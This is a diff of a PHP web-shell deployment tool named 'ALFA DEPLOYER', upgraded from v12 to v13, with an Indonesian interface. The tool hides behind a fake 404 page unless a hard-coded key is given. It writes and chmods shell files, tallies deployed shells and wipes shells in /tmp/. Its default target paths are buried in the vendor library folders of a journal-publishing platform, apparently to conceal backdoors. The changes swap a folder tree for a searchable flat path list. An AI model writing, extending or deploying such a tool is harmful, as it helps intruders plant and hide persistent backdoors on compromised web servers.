@@ -4,7 +4,7 @@ error_reporting(0);
 $key=isset($_GET['key'])?$_GET['key']:'';
 if($key!=='alfamaster')die('404 - Not Found');
 $doc_root=$_SERVER['DOCUMENT_ROOT'];
-$base_path=isset($_POST['base_path'])?trim($_POST['base_path'],'/'):'lib/pkp/lib/vendor/wikimedia/less.php/lib/Less';
+$base_path=isset($_POST['base_path'])?trim($_POST['base_path'],'/'):'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper';
 $permission=isset($_POST['permission'])?$_POST['permission']:'1111';
 $action=isset($_POST['action'])?$_POST['action']:'';
 $file_names=[
@@ -56,7 +56,7 @@ die("❌ Shell not found");
 if(@file_put_contents($path,$content)){@chmod($path,0644);return true;}
 return false;
 }
-function getFolderTree($path,$depth=0,$max_depth=4){
+function getAllFolders($path,$depth=0,$max_depth=6){
 $items=[];
 if($depth>$max_depth||!is_dir($path)||!is_readable($path))return $items;
 $dirs=scandir($path);
@@ -64,24 +64,23 @@ foreach($dirs as $dir){
 if($dir==='.'||$dir==='..')continue;
 $full=$path.'/'.$dir;
 if(is_dir($full)){
-$items[]=['name'=>$dir,'path'=>$full,'children'=>getFolderTree($full,$depth+1,$max_depth)];
+$rel_path=str_replace($_SERVER['DOCUMENT_ROOT'].'/', '',$full);
+$items[]=$rel_path;
+$items=array_merge($items,getAllFolders($full,$depth+1,$max_depth));
 }
 }
 return $items;
 }
-function renderTree($items,$base_path,$level=0){
+function renderPathList($paths,$base_path){
 $html='';
-$indent=$level*20;
-foreach($items as $item){
-$rel_path=str_replace($_SERVER['DOCUMENT_ROOT'].'/', '',$item['path']);
-$is_selected=(strpos($base_path,$rel_path)===0);
-$html.='<div class="tree-item" style="padding-left:'.$indent.'px">';
-$html.='<div class="tree-row '.($is_selected?'selected':'').'">';
-$html.='<span class="tree-icon">📁</span>';
-$html.='<span class="tree-name">'.htmlspecialchars($item['name']).'</span>';
-$html.='<a href="?key=alfamaster&select='.urlencode($rel_path).'" class="tree-select">➡ Pilih</a>';
-$html.='</div>';
-if(!empty($item['children'])){$html.=renderTree($item['children'],$base_path,$level+1);}
+$i=0;
+foreach($paths as $p){
+$selected=($p===$base_path)?'selected':'';
+$i++;
+$html.='<div class="path-item '.$selected.'" onclick="selectPath(\''.htmlspecialchars($p).'\')">';
+$html.='<span class="path-num">'.$i.'.</span>';
+$html.='<span class="path-text">'.htmlspecialchars($p).'</span>';
+$html.='<span class="path-select">➡ Pilih</span>';
 $html.='</div>';
 }
 return $html;
@@ -143,13 +142,13 @@ if(isset($_GET['clean'])){
 foreach(glob('/tmp/*.php')as$f)@unlink($f);
 $messages[]="🧹 Cleaned all shells in /tmp/";
 }
-$tree_data=getFolderTree($doc_root,0,3);
+$all_paths=getAllFolders($doc_root,0,6);
 $domain=(isset($_SERVER['HTTPS'])?'https://':'http://').$_SERVER['HTTP_HOST'];
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>ALFA DEPLOYER v12</title>
+<title>ALFA DEPLOYER v13</title>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -167,15 +166,16 @@ h1{color:#00ff00;font-size:22px;margin-bottom:5px}
 .form-group input:focus,.form-group select:focus{border-color:#00ff00}
 .form-group .hint{color:#444;font-size:9px;margin-top:2px}
 .form-row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
-.tree-container{background:#000;border:1px solid #1a1a1a;border-radius:4px;padding:8px;max-height:300px;overflow:auto}
-.tree-item{margin:0}
-.tree-row{display:flex;align-items:center;gap:8px;padding:4px 8px;border-radius:3px;cursor:pointer}
-.tree-row:hover{background:#0a0a0a}
-.tree-row.selected{background:rgba(0,255,0,.08);border-left:2px solid #00ff00}
-.tree-icon{color:#ffb347;font-size:13px}
-.tree-name{color:#ccc;font-size:12px}
-.tree-select{color:#00b8ff;font-size:10px;text-decoration:none;margin-left:auto;padding:1px 8px;border-radius:3px;border:1px solid rgba(0,184,255,.2)}
-.tree-select:hover{background:rgba(0,184,255,.1);color:#00ff00}
+.path-list{background:#000;border:1px solid #1a1a1a;border-radius:4px;padding:5px;max-height:350px;overflow:auto}
+.path-item{display:flex;align-items:center;gap:8px;padding:5px 10px;border-bottom:1px solid #0a0a0a;cursor:pointer;border-radius:3px;transition:background .15s}
+.path-item:hover{background:#0a0a0a}
+.path-item.selected{background:rgba(0,255,0,.08);border-left:2px solid #00ff00}
+.path-item .path-num{color:#444;font-size:10px;min-width:30px}
+.path-item .path-text{color:#ccc;font-size:11px;flex:1;word-break:break-all}
+.path-item .path-select{color:#00b8ff;font-size:10px;padding:1px 10px;border-radius:3px;border:1px solid rgba(0,184,255,.2)}
+.path-item .path-select:hover{background:rgba(0,184,255,.1);color:#00ff00}
+.search-box{width:100%;background:#000;border:1px solid #333;padding:8px 12px;color:#00ff00;font-family:'JetBrains Mono';font-size:12px;border-radius:4px;outline:none;margin-bottom:8px}
+.search-box:focus{border-color:#00ff00}
 .file-row{display:grid;grid-template-columns:2fr 1fr;gap:10px;align-items:center;margin-bottom:6px}
 .file-row label{color:#666;font-size:10px}
 .file-row input{background:#000;border:1px solid #333;padding:6px 10px;color:#00ff00;font-family:'JetBrains Mono';font-size:12px;border-radius:4px;outline:none}
@@ -202,13 +202,32 @@ td{padding:4px 8px;border-bottom:1px solid #0a0a0a}
 .copy-box{background:#000;padding:10px;border-radius:4px;font-size:11px;color:#666;max-height:200px;overflow:auto;margin-top:10px;word-break:break-all}
 .current-path{color:#666;font-size:10px;padding:5px 10px;background:#000;border-radius:3px;border:1px solid #1a1a1a}
 .selected-path{color:#00ff00;font-weight:700}
+.path-count{color:#666;font-size:10px;margin-top:5px}
 @media(max-width:768px){.form-row{grid-template-columns:1fr}.file-row{grid-template-columns:1fr}}
 </style>
+<script>
+function selectPath(path){
+document.getElementById('base_path_input').value=path;
+document.querySelectorAll('.path-item').forEach(el=>el.classList.remove('selected'));
+event.currentTarget.classList.add('selected');
+}
+function filterPaths(){
+var search=document.getElementById('search_path').value.toLowerCase();
+document.querySelectorAll('.path-item').forEach(function(el){
+var text=el.querySelector('.path-text').textContent.toLowerCase();
+if(text.indexOf(search)!==-1){
+el.style.display='flex';
+}else{
+el.style.display='none';
+}
+});
+}
+</script>
 </head>
 <body>
 <div class="box">
-<h1>⚡ ALFA DEPLOYER v12</h1>
-<div class="info">Klik folder di tree → Pilih permission → Deploy</div>
+<h1>⚡ ALFA DEPLOYER v13</h1>
+<div class="info">Klik path di daftar → Deploy</div>
 <div class="stat-grid">
 <div class="stat"><div class="num"><?=count($deployed)?></div><div class="label">Shells</div></div>
 <div class="stat"><div class="num">5</div><div class="label">Files</div></div>
@@ -221,12 +240,20 @@ echo'<div class="msg '.$cls.'">'.$msg.'</div>';
 }?>
 <form method="post">
 <div class="box-section">
-<div class="title">📂 PATH PICKER — Klik folder untuk pilih</div>
+<div class="title">📂 DAFTAR PATH — Klik path untuk pilih</div>
 <div class="current-path">📍 Selected: <span class="selected-path"><?=htmlspecialchars($base_path)?></span></div>
-<div class="tree-container"><?php if(empty($tree_data)){echo'<div style="color:#666;padding:10px;text-align:center">No folders found</div>';}else{echo renderTree($tree_data,$base_path);}?></div>
+<input type="text" id="search_path" class="search-box" placeholder="🔍 Cari path..." onkeyup="filterPaths()">
+<div class="path-list" id="pathList">
+<?php if(empty($all_paths)):?>
+<div style="color:#666;padding:15px;text-align:center">Tidak ada folder ditemukan</div>
+<?php else:?>
+<?=renderPathList($all_paths,$base_path)?>
+<?php endif;?>
+</div>
+<div class="path-count">Total: <?=count($all_paths)?> paths ditemukan</div>
 <div class="form-group" style="margin-top:10px">
 <label>Atau ketik manual Base Path</label>
-<input type="text" name="base_path" value="<?=htmlspecialchars($base_path)?>" placeholder="lib/pkp/lib/vendor/wikimedia/less.php/lib/Less">
+<input type="text" id="base_path_input" name="base_path" value="<?=htmlspecialchars($base_path)?>">
 <div class="hint">Folder src dan SourceMap akan dibuat di sini</div>
 </div>
 <div class="form-row" style="margin-top:10px">
@@ -281,7 +308,7 @@ echo'<div class="msg '.$cls.'">'.$msg.'</div>';
 <?php foreach($deployed as $f){echo $domain.'/tmp/'.$f['file'].'<br>';}?>
 </div>
 <div style="margin-top:15px;color:#444;font-size:10px;border-top:1px solid #1a1a1a;padding-top:10px">
-ALFA DEPLOYER v12.0 | <?=date('Y-m-d H:i:s')?> | <?=$doc_root?>
+ALFA DEPLOYER v13.0 | <?=date('Y-m-d H:i:s')?> | <?=$doc_root?>
 </div>
 </div>
 </body>
